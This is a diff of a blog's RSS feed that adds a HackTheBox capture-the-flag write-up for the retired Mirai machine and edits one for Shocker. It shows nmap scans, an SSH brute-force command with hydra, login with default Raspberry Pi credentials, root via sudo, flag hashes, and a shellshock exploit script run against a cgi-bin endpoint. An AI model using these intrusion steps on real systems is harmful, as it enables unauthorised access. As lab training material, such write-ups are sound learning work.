@@ -7,6 +7,290 @@
 		<atom:link href="/feed.xml" rel="self" type="application/rss+xml" />
 		
 			<item>
+				<title>HackTheBox - Hacking Mirai</title>
+				<description>&lt;h3 id=&quot;disclaimer&quot;&gt;&lt;strong&gt;Disclaimer:&lt;/strong&gt;&lt;/h3&gt;
+&lt;p&gt;As by the ToS of HackTheBox, solutions cannot be posted before the machine is retired, so you won’t be able to use this post as your way into the described machine, since it’ll already be out-of-service.&lt;/p&gt;
+
+&lt;h1 id=&quot;preface&quot;&gt;Preface&lt;/h1&gt;
+&lt;p&gt;HackTheBox was the first CTF site that I signed up and actually got my hands dirty. The experience is being awesome. If you want somewhere to practice, gather more knowledge, or have some fun, give it a try: https://www.hackthebox.eu/invite&lt;br /&gt;
+&lt;strong&gt;Reminder:&lt;/strong&gt; You have to hack your way in to the registration process. It is worth.&lt;/p&gt;
+
+&lt;h1 id=&quot;lets-begin&quot;&gt;Let’s begin&lt;/h1&gt;
+&lt;p&gt;As my first CTF machine, I’ve chosen Mirai due the difficulty ratings on the list of available machines: Mirai was the lowest hanging fruit. It’s IP was &lt;code class=&quot;highlighter-rouge&quot;&gt;10.10.10.48&lt;/code&gt;. Let the games begin!&lt;/p&gt;
+
+&lt;h2 id=&quot;enumerating&quot;&gt;Enumerating&lt;/h2&gt;
+&lt;blockquote class=&quot;filename&quot;&gt;
+  &lt;p&gt;On my machine&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;root@kali:~# nmap -sS -A -T5 10.10.10.48
+
+Starting Nmap 7.60 ( https://nmap.org ) at 2018-02-02 23:24 -02
+Nmap scan report for 10.10.10.48
+Host is up (0.26s latency).
+Not shown: 997 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 6.7p1 Debian 5+deb8u3 (protocol 2.0)
+| ssh-hostkey: 
+|   1024 aa:ef:5c:e0:8e:86:97:82:47:ff:4a:e5:40:18:90:c5 (DSA)
+|   2048 e8:c1:9d:c5:43:ab:fe:61:23:3b:d7:e4:af:9b:74:18 (RSA)
+|   256 b6:a0:78:38:d0:c8:10:94:8b:44:b2:ea:a0:17:42:2b (ECDSA)
+|_  256 4d:68:40:f7:20:c4:e5:52:80:7a:44:38:b8:a2:a7:52 (EdDSA)
+53/tcp open  domain  dnsmasq 2.76
+| dns-nsid: 
+|_  bind.version: dnsmasq-2.76
+80/tcp open  http    lighttpd 1.4.35
+|_http-server-header: lighttpd/1.4.35
+|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
+Aggressive OS guesses: Linux 3.12 (95%), Linux 3.13 (95%), Linux 3.16 (95%), Linux 3.18 (95%), Linux 3.2 - 4.8 (95%), Linux 3.8 - 3.11 (95%), Linux 4.2 (95%), ASUS RT-N56U WAP (Linux 3.4) (95%), Linux 3.1 (93%), Linux 3.2 (93%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE (using port 1025/tcp)
+HOP RTT       ADDRESS
+1   259.10 ms 10.10.14.1
+2   258.63 ms 10.10.10.48
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 34.05 seconds&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;That’s good. We have a SSH and HTTP service to work on. I’d have started brute-forcing on SSH immediately if I knew any users, so I put it aside for the moment.&lt;/p&gt;
+
+&lt;h3 id=&quot;http-server&quot;&gt;HTTP server&lt;/h3&gt;
+&lt;p&gt;Accessing http://10.10.10.48 returned an empty page.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/mirai/empty-http.png&quot; alt=&quot;img&quot; class=&quot;center-image&quot; /&gt;&lt;em&gt;Empty page on http://10.10.10.48&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;Nothing to work with. So I fired up &lt;code class=&quot;highlighter-rouge&quot;&gt;nmap&lt;/code&gt; again with some native scripts to see if any of them returned stuff I could further explore. The interesting results are below.&lt;/p&gt;
+
+&lt;blockquote class=&quot;filename&quot;&gt;
+  &lt;p&gt;On my machine&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;# Nmap 7.60 scan initiated Fri Feb  2 23:29:50 2018 as: nmap -O -A -sS --script=default,vuln -T5 -o nmap-out2.txt 10.10.10.48
+Nmap scan report for 10.10.10.48
+Host is up (0.25s latency).
+Not shown: 997 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 6.7p1 Debian 5+deb8u3 (protocol 2.0)
+| ssh-hostkey: 
+|   1024 aa:ef:5c:e0:8e:86:97:82:47:ff:4a:e5:40:18:90:c5 (DSA)
+|   2048 e8:c1:9d:c5:43:ab:fe:61:23:3b:d7:e4:af:9b:74:18 (RSA)
+|   256 b6:a0:78:38:d0:c8:10:94:8b:44:b2:ea:a0:17:42:2b (ECDSA)
+|_  256 4d:68:40:f7:20:c4:e5:52:80:7a:44:38:b8:a2:a7:52 (EdDSA)
+53/tcp open  domain  dnsmasq 2.76
+| dns-nsid: 
+|_  bind.version: dnsmasq-2.76
+80/tcp open  http    lighttpd 1.4.35
+| http-cookie-flags: 
+|   /admin/: 
+|     PHPSESSID: 
+|       httponly flag not set
+|   /admin/index.php: 
+|     PHPSESSID: 
+|_      httponly flag not set
+
+... info removed ...
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Fri Feb  2 23:32:04 2018 -- 1 IP address (1 host up) scanned in 133.64 seconds&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Now we know about the existence of &lt;code class=&quot;highlighter-rouge&quot;&gt;/admin/&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;/admin/index.php&lt;/code&gt; (that end up both returning the same page).&lt;br /&gt;
+&lt;img src=&quot;/assets/images/mirai/pi-hole.png&quot; alt=&quot;img&quot; class=&quot;center-image&quot; /&gt;&lt;em&gt;Pi-hole page at http://10.10.10.48/admin&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;While searching about Pi-hole, I found it’s github repository. From there, I started looking for possible users that might be used on the Mirai machine, ending up discovering &lt;code class=&quot;highlighter-rouge&quot;&gt;pihole&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;Since it was the easiest machine at the time, I assumed that it would be enough to proceed.&lt;/p&gt;
+
+&lt;h3 id=&quot;release-the-hydra&quot;&gt;Release the &lt;code class=&quot;highlighter-rouge&quot;&gt;hydra&lt;/code&gt;&lt;/h3&gt;
+&lt;p&gt;I went forward and fired up &lt;code class=&quot;highlighter-rouge&quot;&gt;hydra&lt;/code&gt;&lt;/p&gt;
+
+&lt;blockquote class=&quot;filename&quot;&gt;
+  &lt;p&gt;On my machine&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;hydra -l pihole -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.48 -t 20 -V&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;rockyou.txt&lt;/code&gt; is fairly large, so after some minutes I thought I could go have dinner while &lt;code class=&quot;highlighter-rouge&quot;&gt;hydra&lt;/code&gt; did it’s thing, not putting so much faith on the outcome, honestly.&lt;/p&gt;
+
+&lt;p&gt;With refreshed mind, I came back and noticed that I’d forgotten to add &lt;code class=&quot;highlighter-rouge&quot;&gt;-e nsr&lt;/code&gt;, so I went ahead and tested some combinations manually aswell. The followed combinations resulted in nothing.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;pihole:pihole
+pihole:elohip
+pihole:pi&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Suddenly, I had the epiphany. Damn, it might be a Raspberry Pi which had the default credentials &lt;code class=&quot;highlighter-rouge&quot;&gt;pi:raspberry&lt;/code&gt;.&lt;/p&gt;
+&lt;blockquote class=&quot;filename&quot;&gt;
+  &lt;p&gt;On my machine&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;root@kali:~# ssh pi@10.10.10.48
+pi@10.10.10.48's password: 
+
+pi@raspberrypi:~ $ &lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Great! I was in!&lt;/p&gt;
+
+&lt;blockquote class=&quot;filename&quot;&gt;
+  &lt;p&gt;On the server&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;pi@raspberrypi:~ $ ls
+background.jpg  Documents  list.dir  oldconffiles  Public        root.dir   root.txt   Videos
+Desktop         Downloads  l.dir  Music     Pictures      python_games  root.list  Templates&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Seeing &lt;code class=&quot;highlighter-rouge&quot;&gt;root.txt&lt;/code&gt; made me &lt;code class=&quot;highlighter-rouge&quot;&gt;cat root.txt&lt;/code&gt; but it was empty. It was probably left behind by other people as other files on the same directory.&lt;/p&gt;
+
+&lt;h3 id=&quot;getting-the-user-flag&quot;&gt;Getting the &lt;code class=&quot;highlighter-rouge&quot;&gt;user&lt;/code&gt; flag&lt;/h3&gt;
+&lt;p&gt;Getting the user flag was pretty straightforward:&lt;/p&gt;
+&lt;blockquote class=&quot;filename&quot;&gt;
+  &lt;p&gt;On the server&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;pi@raspberrypi:~ $ find . -name 'user.txt'
+./Desktop/user.txt
+find: `./Desktop/lost+found': Permission denied
+
+pi@raspberrypi:~ $ cat ./Desktop/user.txt
+ff837707441b257a20e32199d7c8838d&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;One down. Let’s root it now!&lt;/p&gt;
+
+&lt;h3 id=&quot;getting-the-root-flag&quot;&gt;Getting the &lt;code class=&quot;highlighter-rouge&quot;&gt;root&lt;/code&gt; flag&lt;/h3&gt;
+&lt;p&gt;Another thing that Raspbian has is being able to &lt;code class=&quot;highlighter-rouge&quot;&gt;sudo&lt;/code&gt; without a password.&lt;/p&gt;
+&lt;blockquote class=&quot;filename&quot;&gt;
+  &lt;p&gt;On the server&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;pi@raspberrypi:~ $ sudo su
+root@raspberrypi:/home/pi#
+root@raspberrypi:/home/pi# cd ~
+root@raspberrypi:~# pwd
+/root&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;As I &lt;code class=&quot;highlighter-rouge&quot;&gt;ls&lt;/code&gt;‘ed on /root I saw:&lt;/p&gt;
+&lt;blockquote class=&quot;filename&quot;&gt;
+  &lt;p&gt;On the server&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;root@raspberrypi:~# ls
+recovered files  root.txt
+root@raspberrypi:~# cat root.txt 
+I lost my original root.txt! I think I may have a backup on my USB stick...&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;It was almost a ‘not so fast, young man’. That engaged me more on the challenge.&lt;/p&gt;
+
+&lt;p&gt;To find the mounted partitions, I ran &lt;code class=&quot;highlighter-rouge&quot;&gt;df -h&lt;/code&gt;&lt;/p&gt;
+&lt;blockquote class=&quot;filename&quot;&gt;
+  &lt;p&gt;On the server&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;root@raspberrypi:~# df -h
+Filesystem      Size  Used Avail Use% Mounted on
+aufs            8.5G  2.8G  5.3G  35% /
+tmpfs           101M   13M   88M  13% /run
+/dev/sda1       1.3G  1.3G     0 100% /lib/live/mount/persistence/sda1
+/dev/loop0      1.3G  1.3G     0 100% /lib/live/mount/rootfs/filesystem.squashfs
+tmpfs           251M     0  251M   0% /lib/live/mount/overlay
+/dev/sda2       8.5G  2.8G  5.3G  35% /lib/live/mount/persistence/sda2
+devtmpfs         10M     0   10M   0% /dev
+tmpfs           251M  8.0K  251M   1% /dev/shm
+tmpfs           5.0M  4.0K  5.0M   1% /run/lock
+tmpfs           251M     0  251M   0% /sys/fs/cgroup
+tmpfs           251M  8.0K  251M   1% /tmp
+/dev/sdb        8.7M   93K  7.9M   2% /media/usbstick
+tmpfs            51M     0   51M   0% /run/user/999
+tmpfs            51M     0   51M   0% /run/user/1000&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;There you are.&lt;/p&gt;
+
+&lt;blockquote class=&quot;filename&quot;&gt;
+  &lt;p&gt;On the server&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;root@raspberrypi:~# cd /media/usbstick
+root@raspberrypi:/media/usbstick# ls
+damnit.txt  lost+found
+root@raspberrypi:/media/usbstick# cat damnit.txt 
+Damnit! Sorry man I accidentally deleted your files off the USB stick.
+Do you know if there is any way to get them back?
+
+-James&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Damn it, James! &lt;code class=&quot;highlighter-rouge&quot;&gt;lost+found&lt;/code&gt; had nothing. Well, maybe James tried to recover the file. Let’s check the &lt;code class=&quot;highlighter-rouge&quot;&gt;history&lt;/code&gt; (only the relevant info is shown).&lt;/p&gt;
+
+&lt;blockquote class=&quot;filename&quot;&gt;
+  &lt;p&gt;On the server&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;root@raspberrypi:/media/usbstick/lost+found# history
+   39  extundelete 
+   58  cd .local/
+   60  cd share/
+   62  cd Trash/
+   64  cd files/&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;I &lt;code class=&quot;highlighter-rouge&quot;&gt;ls&lt;/code&gt;‘ed &lt;code class=&quot;highlighter-rouge&quot;&gt;/home/pi/.local/share/Trash/files&lt;/code&gt; but there was nothing relevant. Let’s try this &lt;code class=&quot;highlighter-rouge&quot;&gt;extundelete&lt;/code&gt; command.&lt;/p&gt;
+
+&lt;blockquote class=&quot;filename&quot;&gt;
+  &lt;p&gt;On the server&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;root@raspberrypi:/media/usbstick/lost+found# extundelete -h
+bash: extundelete: command not found&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;I naïvely tried installing it via &lt;code class=&quot;highlighter-rouge&quot;&gt;apt&lt;/code&gt;. The box couldn’t communicate with the outer-world.&lt;/p&gt;
+
+&lt;p&gt;I searched about &lt;code class=&quot;highlighter-rouge&quot;&gt;extundelete&lt;/code&gt; and found it’s sourceforce page, where I spent a few minutes learning about it. That’s when I saw:&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;Typically, you would replace &quot;partition&quot; in the above examples by a device name like &quot;sda4&quot; or &quot;hdb7&quot;. When either of those commands successfully completes, you can now take the next steps leisurely - you will no longer make anything worse by waiting. If you would like to make a backup of your partition, you may do so by a command such as:
+$ dd bs=4M if=/dev/partition of=partition.backup&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;It made a lot of sense. If I could make a backup of the usb stick and download it, I could mount the backup it on my machine and run &lt;code class=&quot;highlighter-rouge&quot;&gt;extundelete&lt;/code&gt; locally, since it was only 8MB (check &lt;code class=&quot;highlighter-rouge&quot;&gt;df -h&lt;/code&gt; output) and it could be downloaded easily. And so I proceeded. I ran &lt;code class=&quot;highlighter-rouge&quot;&gt;dd if=/dev/sdb of=usb_backup bs=1M&lt;/code&gt; and downloaded it via &lt;code class=&quot;highlighter-rouge&quot;&gt;scp&lt;/code&gt;.&lt;br /&gt;
+Before searching the proper way to mount a file as a directory, why not run &lt;code class=&quot;highlighter-rouge&quot;&gt;strings usb_backup&lt;/code&gt;?&lt;/p&gt;
+
+&lt;blockquote class=&quot;filename&quot;&gt;
+  &lt;p&gt;On the server&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;root@kali:~# strings usb_backup
+&amp;gt;r &amp;amp;
+/media/usbstick
+lost+found
+root.txt
+damnit.txt
+&amp;gt;r &amp;amp;
+&amp;gt;r &amp;amp;
+/media/usbstick
+lost+found
+root.txt
+damnit.txt
+&amp;gt;r &amp;amp;
+/media/usbstick
+2]8^
+lost+found
+root.txt
+damnit.txt
+&amp;gt;r &amp;amp;
+3d3e483143ff12ec505d026fa13e020b
+Damnit! Sorry man I accidentally deleted your files off the USB stick.
+Do you know if there is any way to get them back?
+-James&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;There you are, &lt;em&gt;root hash&lt;/em&gt;!&lt;/p&gt;
+
+&lt;h2 id=&quot;wrapping-up&quot;&gt;Wrapping up&lt;/h2&gt;
+&lt;p&gt;I was my first CTF machine, so some actions were naïve and I overthought a lot, that made me miss some kind of obvious stuff at first glance. It felt very good to start with an IP and work my way in using some knowledge I previously had, get a shell on the machine and finally some out-of-the-box thinking to find the root hash. If it wasn’t for the previously knowledge about the default credentials of Raspbian, it’d have taken a LOT of time to get in. . It motivated me more to keep working on these machines, gaining knowledge and having fun (and sometimes wanting to hit my head on the wall :)&lt;/p&gt;
+
+&lt;p&gt;exit(0);&lt;/p&gt;
+</description>
+				<pubDate>Sat, 10 Feb 2018 14:00:00 -0200</pubDate>
+				<link>/2018/02/htb-ctf-mirai</link>
+				<guid isPermaLink="true">/2018/02/htb-ctf-mirai</guid>
+			</item>
+		
+			<item>
 				<title>Hello World</title>
 				<description>&lt;h1 id=&quot;hello-world&quot;&gt;Hello World&lt;/h1&gt;
 &lt;p&gt;Hey, there! &lt;br /&gt;
@@ -30,6 +314,9 @@ This post has nothing too exciting, it’s more of a test to check that the gith
 &lt;p&gt;Shocker was my second machine, also an easy one (by the ratings), but it was tough to get it. Once I was there, it was straighforward getting the flags. It’s IP was 10.10.10.56.&lt;/p&gt;
 
 &lt;h2 id=&quot;enumerating&quot;&gt;Enumerating&lt;/h2&gt;
+&lt;blockquote class=&quot;filename&quot;&gt;
+  &lt;p&gt;On my machine&lt;/p&gt;
+&lt;/blockquote&gt;
 
 &lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;# Nmap 7.60 scan initiated Sun Feb  4 12:12:55 2018 as: nmap -A -O -sC -sS -T4 -o nmap-shocker.txt 10.10.10.56
 Nmap scan report for 10.10.10.56
@@ -77,427 +364,184 @@ OS and Service detection performed. Please report any incorrect results at https
 
 &lt;p&gt;It means nothing. Well, I still think that the entry point is via web, so I started DirBuster and kept trying to find something.&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;/assets/images/shocker/dirbuster1.png&quot; alt=&quot;img&quot; class=&quot;center-image&quot; /&gt;&lt;em&gt;DirBuster parameters http://10.10.10.56&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/assets/images/shocker/dirbuster1.png&quot; alt=&quot;img&quot; class=&quot;center-image&quot; /&gt;&lt;em&gt;DirBuster parameters&lt;/em&gt;&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;/assets/images/shocker/dirbuster2.png&quot; alt=&quot;img&quot; class=&quot;center-image&quot; /&gt;&lt;em&gt;DirBuster results http://10.10.10.56&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/assets/images/shocker/dirbuster2.png&quot; alt=&quot;img&quot; class=&quot;center-image&quot; /&gt;&lt;em&gt;DirBuster results&lt;/em&gt;&lt;/p&gt;
 
-&lt;p&gt;Nothing to work with. So I fired up &lt;code class=&quot;highlighter-rouge&quot;&gt;nmap&lt;/code&gt; again with some native scripts to see if any of them returned stuff I could further explore. The interesting results are below.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Note 1&lt;/strong&gt;: Later I noticed that using &lt;code class=&quot;highlighter-rouge&quot;&gt;DirBuster&lt;/code&gt; without changing the default parameters was a mistake.&lt;/p&gt;
 
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;# Nmap 7.60 scan initiated Fri Feb  2 23:29:50 2018 as: nmap -O -A -sS --script=default,vuln -T5 -o nmap-out2.txt 10.10.10.48
-Nmap scan report for 10.10.10.48
-Host is up (0.25s latency).
-Not shown: 997 closed ports
-PORT   STATE SERVICE VERSION
-22/tcp open  ssh     OpenSSH 6.7p1 Debian 5+deb8u3 (protocol 2.0)
-| ssh-hostkey: 
-|   1024 aa:ef:5c:e0:8e:86:97:82:47:ff:4a:e5:40:18:90:c5 (DSA)
-|   2048 e8:c1:9d:c5:43:ab:fe:61:23:3b:d7:e4:af:9b:74:18 (RSA)
-|   256 b6:a0:78:38:d0:c8:10:94:8b:44:b2:ea:a0:17:42:2b (ECDSA)
-|_  256 4d:68:40:f7:20:c4:e5:52:80:7a:44:38:b8:a2:a7:52 (EdDSA)
-53/tcp open  domain  dnsmasq 2.76
-| dns-nsid: 
-|_  bind.version: dnsmasq-2.76
-80/tcp open  http    lighttpd 1.4.35
-| http-cookie-flags: 
-|   /admin/: 
-|     PHPSESSID: 
-|       httponly flag not set
-|   /admin/index.php: 
-|     PHPSESSID: 
-|_      httponly flag not set
+&lt;p&gt;I went back and changed the &lt;strong&gt;wordlist&lt;/strong&gt; used. I selected one that was way larger and the &lt;strong&gt;Time to Finish&lt;/strong&gt; was a few hours. I left it running without hopes and gave up to not checking out the forum. I saw a few answers saying to &lt;strong&gt;think what I was looking for&lt;/strong&gt;. Of course I didn’t know at the time, so I kept reading. Some answers started pointing to some dir in the form &lt;code class=&quot;highlighter-rouge&quot;&gt;xxx-bin&lt;/code&gt;. &lt;br /&gt;
+Ok, I should look for something on &lt;code class=&quot;highlighter-rouge&quot;&gt;cgi-bin&lt;/code&gt;, but what? I knew that &lt;code class=&quot;highlighter-rouge&quot;&gt;cgi-bin&lt;/code&gt; contents used to be &lt;strong&gt;perl scripts&lt;/strong&gt;. I took note and kept reading. Some comments refered to the name of the machine and one asked something like:&lt;/p&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;-Should I keep searching for a working shellshock exploit? &lt;br /&gt;
+-Yes&lt;/p&gt;
+&lt;/blockquote&gt;
 
-... info removed ...
+&lt;p&gt;Now I know that I should search inside &lt;code class=&quot;highlighter-rouge&quot;&gt;cgi-bin&lt;/code&gt; and the machine has something to do with &lt;code class=&quot;highlighter-rouge&quot;&gt;shellshock&lt;/code&gt;. Let’s return to &lt;code class=&quot;highlighter-rouge&quot;&gt;DirBuster&lt;/code&gt;.&lt;br /&gt;
+For the sake of conservativeness, I set &lt;code class=&quot;highlighter-rouge&quot;&gt;sh,pl&lt;/code&gt; on the *File extension` field.&lt;/p&gt;
 
-OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-# Nmap done at Fri Feb  2 23:32:04 2018 -- 1 IP address (1 host up) scanned in 133.64 seconds&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+&lt;p&gt;&lt;img src=&quot;/assets/images/shocker/dirbuster3.png&quot; alt=&quot;img&quot; class=&quot;center-image&quot; /&gt;&lt;em&gt;DirBuster parameters used on the successful run&lt;/em&gt;&lt;/p&gt;
 
-&lt;p&gt;Now we know about the existence of &lt;code class=&quot;highlighter-rouge&quot;&gt;/admin/&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;/admin/index.php&lt;/code&gt; (that end up both returning the same page).&lt;br /&gt;
-&lt;img src=&quot;/assets/images/mirai/pi-hole.png&quot; alt=&quot;img&quot; class=&quot;center-image&quot; /&gt;&lt;em&gt;Pi-hole page at http://10.10.10.48/admin&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/assets/images/shocker/dirbuster4.png&quot; alt=&quot;img&quot; class=&quot;center-image&quot; /&gt;&lt;em&gt;DirBuster successful results&lt;/em&gt;&lt;/p&gt;
 
-&lt;p&gt;While searching about Pi-hole, I found it’s github repository. From there, I started looking for possible users that might be used on the Mirai machine, ending up discovering &lt;code class=&quot;highlighter-rouge&quot;&gt;pihole&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Note 2&lt;/strong&gt;: Between the first and successful DirBuster runs, it took about 2 hours.&lt;/p&gt;
 
-&lt;p&gt;Since it was the easiest machine at the time, I assumed that it would be enough to proceed.&lt;/p&gt;
+&lt;p&gt;I was sure that it was the entry point. I &lt;code class=&quot;highlighter-rouge&quot;&gt;curl&lt;/code&gt;‘ed &lt;code class=&quot;highlighter-rouge&quot;&gt;10.10.10.56/cgi-bin/user.sh&lt;/code&gt; and saw this:&lt;/p&gt;
 
-&lt;h3 id=&quot;release-the-hydra&quot;&gt;Release the &lt;code class=&quot;highlighter-rouge&quot;&gt;hydra&lt;/code&gt;&lt;/h3&gt;
-&lt;p&gt;I went forward and fired up &lt;code class=&quot;highlighter-rouge&quot;&gt;hydra&lt;/code&gt;&lt;/p&gt;
+&lt;blockquote class=&quot;filename&quot;&gt;
+  &lt;p&gt;On my machine&lt;/p&gt;
+&lt;/blockquote&gt;
 
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;hydra -l pihole -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.48 -t 20 -V&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;root@kali:~/ctf/shocker# curl http://10.10.10.56/cgi-bin/user.sh
+Content-Type: text/plain
 
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;rockyou.txt&lt;/code&gt; is fairly large, so after some minutes I thought I could go have dinner while &lt;code class=&quot;highlighter-rouge&quot;&gt;hydra&lt;/code&gt; did it’s thing, not putting so much faith on the outcome, honestly.&lt;/p&gt;
+Just an uptime test script
 
-&lt;p&gt;With refreshed mind, I came back and noticed that I’d forgotten to add &lt;code class=&quot;highlighter-rouge&quot;&gt;-e nsr&lt;/code&gt;, so I went ahead and tested some combinations manually aswell. The followed combinations resulted in nothing.&lt;/p&gt;
+ 09:45:45 up  1:33,  0 users,  load average: 0.80, 0.59, 0.49&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
 
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;pihole:pihole
-pihole:elohip
-pihole:pi&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+&lt;p&gt;Let’s find a &lt;code class=&quot;highlighter-rouge&quot;&gt;shellshock&lt;/code&gt; exploit. I asked the internet and it returned this particular page: TODO FIND THE LINK&lt;/p&gt;
 
-&lt;p&gt;Suddenly, I had the epiphany. Damn, it might be a Raspberry Pi which had the default credentials &lt;code class=&quot;highlighter-rouge&quot;&gt;pi:raspberry&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;So I downloaded it and ran:&lt;/p&gt;
+&lt;blockquote class=&quot;filename&quot;&gt;
+  &lt;p&gt;On my machine&lt;/p&gt;
+&lt;/blockquote&gt;
 
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;root@kali:~# ssh pi@10.10.10.48
-pi@10.10.10.48's password: 
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;root@kali:~/ctf/shocker# ./shellshock.py -u http://10.10.10.56/cgi-bin/user.sh
+&amp;gt; id
+uid=1000(shelly) gid=1000(shelly) groups=1000(shelly),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
+&amp;gt; pwd
+/usr/lib/cgi-bin
+&amp;gt; &lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
 
